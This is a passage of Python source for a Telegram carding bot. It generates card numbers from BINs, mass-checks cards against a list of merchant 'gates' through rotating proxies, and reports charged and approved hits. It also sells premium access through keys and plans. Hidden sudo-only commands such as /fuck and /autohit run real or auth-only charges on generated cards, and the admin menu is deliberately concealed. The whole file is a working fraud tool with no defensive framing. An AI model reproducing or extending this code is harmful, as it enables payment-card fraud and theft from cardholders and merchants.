    rate    = (charged_ct + approved_ct) / max(checked, 1) * 100

    dl_kb = kb_mrz_results(uid)

    await status_msg.edit_text(
        f"{e('check')} <b>{'STOPPED' if stopped else 'COMPLETE'}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('stats')} <b>Summary</b>\n"
        f"  ► cards · <code>{checked:,}</code>\n"
        f"  ► elapsed · <code>{elapsed//60}m {elapsed%60}s</code>\n"
        f"  ► hit rate · <code>{rate:.1f}%</code>\n\n"
        f"{e('stats')} <b>Hit Count</b>\n"
        f"  ► {e('charged')} Charged · <code>{charged_ct}</code>\n"
        f"  ► {e('approved')} Approved · <code>{approved_ct}</code>\n"
        f"  ► {e('dead')} DEAD · <code>{dead_ct}</code>\n"
        f"  ► {e('error')} Error · <code>{error_ct}</code>\n"
        f"  ► {e('eyes')} Skipped · <code>{skipped}</code>\n\n"
        f"  ► checked by · {e('user')} <a href='tg://user?id={uid}'>{safe(user.first_name)}</a>",
        parse_mode=ParseMode.HTML,
        reply_markup=dl_kb)

@need_join
async def cmd_mrzstop(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    ev  = active_mrz.get(uid)
    if ev and not ev.is_set():
        ev.set()
        await u.message.reply_text(
            f"{e('stop')} Stop signal sent. Halting after current card.",
            parse_mode=ParseMode.HTML)
    else:
        await u.message.reply_text(f"{e('info')} No active mass job.", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# /gen — card generation (premium)
# ═══════════════════════════════════════════════════════
@need_premium
async def cmd_gen(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    ok, msg = check_rate(uid)
    if not ok:
        await u.message.reply_text(f"{e('cooldown')} {e('timer')} Cooldown — wait {msg}", parse_mode=ParseMode.HTML); return
    if not ctx.args:
        await u.message.reply_text(
            f"{e('card')} /gen BIN amount\n  ex: <code>/gen 411111 100</code>",
            parse_mode=ParseMode.HTML); return
    bp = ctx.args[0]
    try: count = int(ctx.args[1]) if len(ctx.args) > 1 else 10
    except ValueError: count = 10
    count = max(1, min(count, MAX_LIMIT))
    ok2, err = validate_bin(bp)
    if not ok2:
        await u.message.reply_text(f"{e('error')} {err}", parse_mode=ParseMode.HTML); return
    bin6 = bp.split("|")[0][:8]
    binfo= await lookup_bin(bin6)
    st   = await u.message.reply_text(
        f"{e('loading')} Generating <code>{count:,}</code> cards...\n"
        f"  {e('bin')} {bin6} · {binfo['scheme']} · {safe(binfo['bank'])} · {safe(binfo['country'])} {binfo['flag']}",
        parse_mode=ParseMode.HTML)
    fc = gen_ct = 0; chunk: List[str] = []
    try:
        for card in gen_cards(bp, count):
            chunk.append(card); gen_ct += 1
            if len(chunk) >= MAX_LINES_PER_FILE:
                fc += 1; bio = BytesIO("\n".join(chunk).encode()); bio.name = f"gen_{bin6}_p{fc}.txt"
                await _send_file(u.message, "\n".join(chunk), f"gen_{bin6}_p{fc}.txt",
                    f"{e('check')} <b>Part {fc}</b> — {len(chunk):,} cards"); chunk = []
                await asyncio.sleep(SEND_DELAY)
        if chunk:
            fc += 1
            await _send_file(u.message, "\n".join(chunk), f"gen_{bin6}_p{fc}.txt",
                f"{e('check')} <b>Part {fc}</b> — {len(chunk):,} cards")
        await redis.hincrby(RK_STATS, "total_generated", gen_ct)
        await st.edit_text(
            f"{e('check')} Generated <code>{gen_ct:,}</code> cards in {fc} file(s)\n"
            f"  {e('bin')} {bin6} · {binfo['scheme']} · {safe(binfo['country'])} {binfo['flag']}",
            parse_mode=ParseMode.HTML)
    except Exception as ex:
        await st.edit_text(f"{e('error')} {safe(str(ex)[:80])}", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# /split — split file (premium)
# ═══════════════════════════════════════════════════════
@need_premium
async def cmd_split(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    ok, msg = check_rate(uid)
    if not ok:
        await u.message.reply_text(f"{e('cooldown')} {msg}", parse_mode=ParseMode.HTML); return
    if not ctx.args:
        await u.message.reply_text(
            f"{e('file')} Reply to .txt with <code>/split 5</code>", parse_mode=ParseMode.HTML); return
    try: n = int(ctx.args[0])
    except: await u.message.reply_text(f"{e('error')} Parts must be a number.", parse_mode=ParseMode.HTML); return
    if not 2 <= n <= MAX_SPLIT_PARTS:
        await u.message.reply_text(f"{e('error')} Parts: 2–{MAX_SPLIT_PARTS}.", parse_mode=ParseMode.HTML); return
    rep = u.message.reply_to_message
    if not rep or not rep.document:
        await u.message.reply_text(f"{e('error')} Reply to a .txt file.", parse_mode=ParseMode.HTML); return
    doc = rep.document
    if not (doc.file_name or "").lower().endswith(".txt"):
        await u.message.reply_text(f"{e('error')} Only .txt files.", parse_mode=ParseMode.HTML); return
    st = await u.message.reply_text(f"{e('loading')} Processing...", parse_mode=ParseMode.HTML)
    try:
        buf = BytesIO(); tgf = await doc.get_file(); await tgf.download_to_memory(out=buf); buf.seek(0)
        try:    content = buf.read().decode("utf-8")
        except: buf.seek(0); content = buf.read().decode("utf-8", errors="replace")
        lines = [x.strip() for x in content.splitlines() if x.strip()]
        if not lines:
            await st.edit_text(f"{e('error')} File is empty.", parse_mode=ParseMode.HTML); return
        if n > len(lines):
            await st.edit_text(f"{e('error')} Only {len(lines):,} lines, can't split into {n}.", parse_mode=ParseMode.HTML); return
        cs = math.ceil(len(lines)/n)
        chunks = [lines[i:i+cs] for i in range(0,len(lines),cs)]
        base = (doc.file_name or "file")[:-4]
        await st.edit_text(f"{e('loading')} Sending {len(chunks)} parts...", parse_mode=ParseMode.HTML)
        for idx, chunk in enumerate(chunks, 1):
            await _send_file(u.message, "\n".join(chunk), f"{base}_p{idx}of{len(chunks)}.txt",
                f"{e('check')} <b>Part {idx}/{len(chunks)}</b> — {len(chunk):,} lines")
            await asyncio.sleep(SEND_DELAY)
        await st.edit_text(
            f"{e('check')} Split <code>{len(lines):,}</code> lines into <b>{len(chunks)}</b> parts.",
            parse_mode=ParseMode.HTML)
    except Exception as ex:
        await st.edit_text(f"{e('error')} {safe(str(ex)[:80])}", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# ADMIN COMMANDS (all hidden — only via /bhosade)
# ═══════════════════════════════════════════════════════

@need_sudo
async def cmd_addsite(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /addsite URL", parse_mode=ParseMode.HTML); return
    url = " ".join(ctx.args).strip()
    if not url.startswith(("http://","https://")):
        await u.message.reply_text(f"{e('error')} Must start with https://", parse_mode=ParseMode.HTML); return
    existing = await redis.lrange(RK_SITES, 0, -1)
    if url in existing:
        await u.message.reply_text(f"{e('error')} Site already exists.", parse_mode=ParseMode.HTML); return
    msg = await u.message.reply_text(f"{e('loading')} Testing gate...", parse_mode=ParseMode.HTML)
    UA = _gen_ua()
    sd = await load_site_data(url, UA, None, auto_remove=False)
    await redis.lpush(RK_SITES, url)
    total = await redis.llen(RK_SITES)
    icon  = e("check") if sd else e("error")
    await msg.edit_text(
        f"{icon} Site {'added & working' if sd else 'added (not responding yet)'}\n"
        f"{e('stats')} Total gates: <code>{total}</code>", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_live(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML); return
    lines = "\n".join(f"  {i+1}. <code>{safe(s)}</code>" for i,s in enumerate(sites))
    await u.message.reply_text(f"{e('site')} <b>Sites ({len(sites)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_checksite(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML); return
    proxies = await get_live_proxies(auto_remove=True)
    px = pick_proxy(proxies)
    UA = _gen_ua()
    msg = await u.message.reply_text(
        f"{e('loading')} Testing {len(sites)} sites (auto-removing dead)...", parse_mode=ParseMode.HTML)
    out = []; alive = dead = 0
    for site in sites:
        sd = await load_site_data(site, UA, px, auto_remove=True)
        if sd:
            alive += 1; out.append(f"  {e('check')} <code>{safe(site[:55])}</code>")
        else:
            dead += 1; out.append(f"  {e('cross')} <s>{safe(site[:55])}</s> (removed)")
    await msg.edit_text(
        f"{e('search')} <b>Site Check</b> — {alive} live, {dead} removed\n\n" + "\n".join(out),
        parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_rmsite(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML); return
    if ctx.args:
        try:
            idx = int(ctx.args[0])-1
            if 0 <= idx < len(sites):
                await redis.lrem(RK_SITES, 0, sites[idx])
                await u.message.reply_text(f"{e('check')} Removed site #{idx+1}.", parse_mode=ParseMode.HTML)
            return
        except ValueError: pass
    kb = [[btn(f"🗑 #{i+1}", f"rmsite_{i}")] for i in range(len(sites))]
    kb.append([btn(f"{e('cross')} Cancel", "cancel")])
    await u.message.reply_text(f"{e('gear')} Pick site to remove:",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

@need_sudo
async def cmd_addpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(
            f"{e('proxy')} /addpxy proxy1 proxy2...\n"
            f"Formats: ip:port | ip:port:user:pass | user:pass@ip:port | scheme://...",
            parse_mode=ParseMode.HTML); return
    existing = set(await redis.lrange(RK_PROXIES, 0, -1))
    added = bad = dupe = 0
    for raw in ctx.args:
        if not parse_proxy(raw): bad += 1; continue
        if raw in existing: dupe += 1; continue
        await redis.lpush(RK_PROXIES, raw); existing.add(raw); added += 1
    total = await redis.llen(RK_PROXIES)
    await u.message.reply_text(
        f"{e('check')} Added: <code>{added}</code> | Bad: <code>{bad}</code> | Dupe: <code>{dupe}</code>\n"
        f"{e('proxy')} Total: <code>{total}</code>", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_proxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await u.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML); return
    lines = "\n".join(f"  {i+1}. <code>{safe(p)}</code>" for i,p in enumerate(proxies))
    await u.message.reply_text(f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_testpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await u.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML); return
    msg = await u.message.reply_text(
        f"{e('loading')} Testing {len(proxies)} proxies (auto-removing dead)...", parse_mode=ParseMode.HTML)
    good = bad = 0; out = []
    for raw in proxies:
        ok, lat = await test_proxy_raw(raw)
        if ok:
            good += 1; out.append(f"  {e('check')} <code>{safe(raw[:40])}</code> · {lat:.0f}ms")
        else:
            bad += 1; await redis.lrem(RK_PROXIES, 0, raw)
            out.append(f"  {e('cross')} <s>{safe(raw[:40])}</s> (removed)")
    await msg.edit_text(
        f"{e('proxy')} <b>Proxy Test</b> — {good} live, {bad} removed\n\n" + "\n".join(out),
        parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_rmpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await u.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML); return
    if ctx.args:
        try:
            idx = int(ctx.args[0])-1
            if 0 <= idx < len(proxies):
                await redis.lrem(RK_PROXIES, 0, proxies[idx])
                await u.message.reply_text(f"{e('check')} Proxy #{idx+1} removed.", parse_mode=ParseMode.HTML)
            return
        except ValueError: pass
    kb = [[btn(f"🗑 #{i+1}", f"rmpxy_{i}")] for i in range(len(proxies))]
    kb.append([btn(f"{e('cross')} Cancel", "cancel")])
    await u.message.reply_text(f"{e('gear')} Pick proxy to remove:",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

@need_sudo
async def cmd_clrpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await redis.delete(RK_PROXIES)
    await u.message.reply_text(f"{e('check')} All proxies cleared.", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_addbim(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(
            f"{e('bin')} /addbim BIN1 BIN2...\nEx: <code>/addbim 411111 5xxxxx|12|25|rnd</code>",
            parse_mode=ParseMode.HTML); return
    existing = set(await redis.lrange(RK_BINS, 0, -1))
    added = bad = dupe = 0
    for bp in ctx.args:
        ok, _ = validate_bin(bp)
        if not ok: bad += 1; continue
        if bp in existing: dupe += 1; continue
        await redis.lpush(RK_BINS, bp); existing.add(bp); added += 1
    await u.message.reply_text(
        f"{e('check')} Added: <code>{added}</code> | Bad: <code>{bad}</code> | Dupe: <code>{dupe}</code>",
        parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_chkbim(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML); return
    lines = "\n".join(f"  {i+1}. <code>{safe(b)}</code>" for i,b in enumerate(bins))
    await u.message.reply_text(f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_rmbin(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML); return
    if ctx.args:
        try:
            idx = int(ctx.args[0])-1
            if 0 <= idx < len(bins):
                await redis.lrem(RK_BINS, 0, bins[idx])
                await u.message.reply_text(f"{e('check')} BIN #{idx+1} removed.", parse_mode=ParseMode.HTML)
            return
        except ValueError: pass
    kb = [[btn(f"🗑 {b}", f"rmbin_{i}")] for i,b in enumerate(bins)]
    kb.append([btn(f"{e('cross')} Cancel", "cancel")])
    await u.message.reply_text(f"{e('gear')} Pick BIN to remove:",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

@need_sudo
async def cmd_stats(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites   = await redis.llen(RK_SITES)
    proxies = await redis.llen(RK_PROXIES)
    bins    = await redis.llen(RK_BINS)
    sudos   = len(await redis.smembers(RK_SUDO))
    banned  = len(await redis.smembers(RK_BANNED))
    gen     = await redis.hget(RK_STATS, "total_generated") or "0"
    hits    = await redis.hget(RK_STATS, "total_hits")      or "0"
    charged = await redis.hget(RK_STATS, "total_charged")   or "0"
    approved= await redis.hget(RK_STATS, "total_approved")  or "0"
    await u.message.reply_text(
        f"{e('stats')} <b>Bot Stats</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('site')}   Gates:    <code>{sites}</code>\n"
        f"{e('proxy')}  Proxies:  <code>{proxies}</code>\n"
        f"{e('bin')}    BINs:     <code>{bins}</code>\n"
        f"{e('crown')}  Sudos:    <code>{sudos}</code>\n"
        f"{e('ban')}    Banned:   <code>{banned}</code>\n\n"
        f"{e('card')}   Generated: <code>{gen}</code>\n"
        f"{e('charged')} Charged:  <code>{charged}</code>\n"
        f"{e('approved')} Approved: <code>{approved}</code>\n"
        f"{e('stats')}  Total Hits: <code>{hits}</code>\n\n"
        f"{e('fire')}   v7.0 · {BOT_CREATOR}", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_sudo_add(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(u.effective_user.id):
        await u.message.reply_text(f"{e('ban')} Owner only.", parse_mode=ParseMode.HTML); return
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /sudo ID", parse_mode=ParseMode.HTML); return
    try:
        t = int(ctx.args[0]); await redis.sadd(RK_SUDO, str(t))
        await u.message.reply_text(f"{e('check')} <code>{t}</code> is now sudo.", parse_mode=ParseMode.HTML)
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_unsudo(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(u.effective_user.id):
        await u.message.reply_text(f"{e('ban')} Owner only.", parse_mode=ParseMode.HTML); return
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /unsudo ID", parse_mode=ParseMode.HTML); return
    try:
        t = int(ctx.args[0]); await redis.srem(RK_SUDO, str(t))
        await u.message.reply_text(f"{e('check')} Sudo revoked from <code>{t}</code>.", parse_mode=ParseMode.HTML)
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_sudolist(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(u.effective_user.id):
        await u.message.reply_text(f"{e('ban')} Owner only.", parse_mode=ParseMode.HTML); return
    ms = await redis.smembers(RK_SUDO)
    if not ms:
        await u.message.reply_text(f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML); return
    lines = "\n".join(f"  {e('star')} <code>{m}</code>" for m in sorted(ms))
    await u.message.reply_text(f"{e('crown')} <b>Sudo Users</b>\n\n{lines}", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_ban(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /ban ID", parse_mode=ParseMode.HTML); return
    try:
        t = int(ctx.args[0])
        if t == ADMIN_USER_ID:
            await u.message.reply_text(f"{e('error')} Can't ban owner.", parse_mode=ParseMode.HTML); return
        await redis.sadd(RK_BANNED, str(t))
        await u.message.reply_text(f"{e('ban')} <code>{t}</code> banned.", parse_mode=ParseMode.HTML)
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_unban(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /unban ID", parse_mode=ParseMode.HTML); return
    try:
        t = int(ctx.args[0]); await redis.srem(RK_BANNED, str(t))
        await u.message.reply_text(f"{e('check')} <code>{t}</code> unbanned.", parse_mode=ParseMode.HTML)
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_banlist(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    banned = await redis.smembers(RK_BANNED)
    if not banned:
        await u.message.reply_text(f"{e('check')} No banned users.", parse_mode=ParseMode.HTML); return
    lines = "\n".join(f"  {e('ban')} <code>{m}</code>" for m in sorted(banned))
    await u.message.reply_text(f"{e('skull')} <b>Banned ({len(banned)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)

@need_sudo
async def cmd_addplan(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args or len(ctx.args) < 2:
        await u.message.reply_text(f"{e('error')} /addplan ID days [name]", parse_mode=ParseMode.HTML); return
    try:
        t = int(ctx.args[0]); days = int(ctx.args[1])
        name = " ".join(ctx.args[2:]) if len(ctx.args)>2 else "Premium"
        exp = await give_plan(t, days, name, u.effective_user.id)
        await u.message.reply_text(
            f"{e('check')} Plan assigned!\n"
            f"  {e('user')} User: <code>{t}</code>\n"
            f"  {e('plan')} Plan: <b>{safe(name)}</b>\n"
            f"  {e('clock')} Expires: <code>{exp}</code>", parse_mode=ParseMode.HTML)
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid values.", parse_mode=ParseMode.HTML)

async def cmd_genkey(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    if await is_banned(uid): return
    if not is_admin(uid) and not await is_sudo(uid):
        await u.message.reply_text(f"{e('lock')} Admin/Sudo only.", parse_mode=ParseMode.HTML); return
    if not ctx.args:
        await u.message.reply_text(
            f"{e('key')} /genkey days [count]\n  ex: <code>/genkey 30 5</code>",
            parse_mode=ParseMode.HTML); return
    try:
        days  = int(ctx.args[0])
        count = max(1, min(int(ctx.args[1]) if len(ctx.args)>1 else 1, 20))
        if days <= 0:
            await u.message.reply_text(f"{e('error')} Days must be > 0.", parse_mode=ParseMode.HTML); return
        msg  = await u.message.reply_text(f"{e('loading')} Generating...", parse_mode=ParseMode.HTML)
        keys = await create_keys(days, count, uid)
        lines = "\n".join(f"  {e('key')} <code>{k}</code>" for k in keys)
        await msg.edit_text(
            f"{e('check')} <b>{count} Key(s) — {days} days each</b>\n\n{lines}",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid.", parse_mode=ParseMode.HTML)

# /fuck and /autohit — REAL charge / auto-hit (sudo only, completely hidden)
@need_sudo
async def cmd_fuck(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    bins  = await redis.lrange(RK_BINS, 0, -1)
    if not sites: await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML); return
    if not bins:  await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML); return
    proxies_ct = await redis.llen(RK_PROXIES)
    kb = InlineKeyboardMarkup([
        [btn("🟩 ₹1","fuck_100"),   btn("🟦 ₹10","fuck_1000")],
        [btn("🟧 ₹50","fuck_5000"), btn("🟥 ₹100","fuck_10000")],
        [btn(f"{e('cross')} Cancel","cancel")],
    ])
    await u.message.reply_text(
        f"{e('fire')} <b>Real Charge Test</b>\n\n"
        f"  {e('site')}  Gates:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies_ct}</code>\n\n"
        f"{e('warning')} <i>Cards will be ACTUALLY charged!</i>\n"
        f"Select amount:",
        parse_mode=ParseMode.HTML, reply_markup=kb)

@need_sudo
async def cmd_autohit(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    bins  = await redis.lrange(RK_BINS, 0, -1)
    if not sites: await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML); return
    if not bins:  await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML); return
    proxies_ct = await redis.llen(RK_PROXIES)
    kb = InlineKeyboardMarkup([
        [btn("🟩 ₹1","auto_100"),   btn("🟦 ₹10","auto_1000")],
        [btn("🟧 ₹50","auto_5000"), btn("🟥 ₹100","auto_10000")],
        [btn(f"{e('cross')} Cancel","cancel")],
    ])
    await u.message.reply_text(
        f"{e('bolt')} <b>Auto-Hit Checker</b>\n\n"
        f"  {e('site')}  Gates:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies_ct}</code>\n\n"
        f"{e('info')} Auto-cancel after auth — no real charge",
        parse_mode=ParseMode.HTML, reply_markup=kb)

@need_sudo
async def cmd_stop_test(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    cid = u.effective_chat.id
    if active_tests.get(cid):
        active_tests[cid] = False
        await u.message.reply_text(f"{e('stop')} Stopping...", parse_mode=ParseMode.HTML)
    else:
        await u.message.reply_text(f"{e('info')} No active test.", parse_mode=ParseMode.HTML)

async def run_autohit(chat_id: int, amount: int, ctx, cancel_mode: bool, tg_user) -> None:
    sites   = await redis.lrange(RK_SITES, 0, -1)
    bins    = await redis.lrange(RK_BINS, 0, -1)
    if not sites or not bins:
        await ctx.bot.send_message(chat_id, f"{e('error')} Missing sites/BINs.", parse_mode=ParseMode.HTML); return
    proxies = await get_live_proxies(auto_remove=True)
    cards   = list(gen_cards(random.choice(bins) if bins else "411111", BATCH_SIZE*8))
    if not cards:
        await ctx.bot.send_message(chat_id, f"{e('error')} Card gen failed.", parse_mode=ParseMode.HTML); return
    amt_inr   = amount // 100
    mode_str  = "Real Charge" if not cancel_mode else "Auto-Hit"
    sm = await ctx.bot.send_message(
        chat_id,
        f"{e('fire')} <b>{mode_str} Started</b>\n"
        f"  {e('coin')} Amount: ₹{amt_inr}\n"
        f"  {e('card')} Cards: {len(cards)}\n"
        f"  {e('lock')} Gates: hidden",
        parse_mode=ParseMode.HTML)
    active_tests[chat_id] = True
    live_sites = await get_live_sites(proxies)
    if not live_sites:
        await sm.edit_text(f"{e('error')} No live gates!", parse_mode=ParseMode.HTML)
        active_tests.pop(chat_id, None); return
    ok_ct = ch_ct = fail_ct = 0
    for card_str in cards:
        if not active_tests.get(chat_id): break
        p = parse_cc(card_str)
        if not p: continue
        cc_n,mm_n,yy_n,cvv_n = p
        site = random.choice(live_sites)
        px   = pick_proxy(proxies)
        res  = await check_card(cc_n,mm_n,yy_n,cvv_n, site, px, amount)
        st   = res.get("status","error"); msg_r = res.get("message","")
        if st == "charged":
            ch_ct += 1
            await ctx.bot.send_message(
                chat_id,
                f"{e('charged')} <b>CHARGED</b> · ₹{amt_inr}\n"
                f"  {e('bolt')} {safe(msg_r[:70])}",
                parse_mode=ParseMode.HTML)
            if tg_user: await log_hit(ctx, "CHARGED", card_str, amt_inr, tg_user, msg_r)
        elif st == "approved":
            ok_ct += 1
            if tg_user: await log_hit(ctx, "APPROVED", card_str, amt_inr, tg_user, msg_r)
        else:
            fail_ct += 1
        await redis.hincrby(RK_STATS, "total_hits", 1)
        await asyncio.sleep(0.3)
    active_tests.pop(chat_id, None)
    await sm.edit_text(
        f"{e('check')} <b>{mode_str} Complete</b>\n\n"
        f"  {e('charged')} Charged: <code>{ch_ct}</code>\n"
        f"  {e('approved')} Live:   <code>{ok_ct}</code>\n"
        f"  {e('dead')} Dead:    <code>{fail_ct}</code>",
        parse_mode=ParseMode.HTML)

# /bhosade — HIDDEN admin menu (sudo only, silently ignored for normal users)
async def cmd_bhosade(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    if await is_banned(uid): return
    if not await is_sudo(uid): return  # silent ignore
    own = is_admin(uid)
    oc = f"\n{e('crown')} <b>Owner Commands</b>\n  /sudo /unsudo /sudolist\n" if own else ""
    await u.message.reply_text(
        f"{e('fire')} <b>Full Command Menu</b> {e('lock')} <i>sudo only</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{oc}"
        f"\n{e('user')} <b>Users</b>\n  /ban /unban /banlist /addplan /genkey\n"
        f"\n{e('site')} <b>Gates</b> (hidden)\n  /addsite /live /checksite /rmsite\n"
        f"\n{e('proxy')} <b>Proxies</b> (hidden)\n  /addpxy /proxy /testpxy /rmpxy /clrpxy\n"
        f"\n{e('bin')} <b>BINs</b>\n  /addbim /chkbim /rmbin /bin\n"
        f"\n{e('fire')} <b>Payment</b> (hidden)\n  /fuck (real) · /autohit (cancel) · /stoptest\n"
        f"\n{e('card')} <b>Cards</b>\n  /gen /split /stats\n"
        f"\n{e('star')} <b>Public</b>\n  /rz /mrz /mrzstop /plans /redeem /profile /start /help",
        parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# CALLBACK HANDLER
# ═══════════════════════════════════════════════════════
async def handle_callbacks(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q   = u.callback_query
    await q.answer()
    data = q.data
    uid  = q.from_user.id
    user = q.from_user

    # ── Join check ──────────────────────────────────────
    if data == "verify_join":
        ch, gr = await check_joined(ctx.bot, uid)
        if ch and gr:
            await q.edit_message_text(
                f"{e('check')} <b>Verified!</b>\n\n"
                f"{e('sparkle')} You can now use all commands.\n"
                f"Use /start to begin!",
                parse_mode=ParseMode.HTML)
        else:
            rows = []
            if not ch: rows.append([InlineKeyboardButton(f"{e('channel')} Join Channel", url=CHANNEL_LINK)])
            if not gr: rows.append([InlineKeyboardButton(f"{e('group')} Join Group", url=GROUP_LINK)])
            rows.append([btn(f"{e('check')} Check Again", "verify_join")])
            await q.edit_message_text(
                f"{e('cross')} Still not joined!\n\n"
                f"{'❌' if not ch else '✅'} Channel\n"
                f"{'❌' if not gr else '✅'} Group",
                parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "cancel":
        try: await q.edit_message_text(f"{e('cross')} Cancelled.", parse_mode=ParseMode.HTML)
        except: pass
        return

    # ── Plans ────────────────────────────────────────────
    if data == "plans_buy":
        await q.answer(f"Contact {BOT_CREATOR} to purchase a plan!", show_alert=True)
        return

    # ── Download results ──────────────────────────────────
    if data.startswith("dl_"):
        parts = data.split("_", 2)
        if len(parts) < 3: return
        dl_type  = parts[1]  # charged/approved/dead/errors/all
        try: target_uid = int(parts[2])
        except: return
        if uid != target_uid and not await is_sudo(uid):
            await q.answer("Not your results.", show_alert=True); return
        results = mrz_results.get(target_uid, {})
        if dl_type == "all":
            all_lines = (
                ["# === CHARGED ==="] + results.get("charged",[]) +
                ["# === APPROVED ==="] + results.get("approved",[]) +
                ["# === DEAD ==="] + results.get("dead",[]) +
                ["# === ERRORS ==="] + results.get("errors",[])
            )
            content = "\n".join(all_lines)
            fname   = f"all_results_{target_uid}.txt"
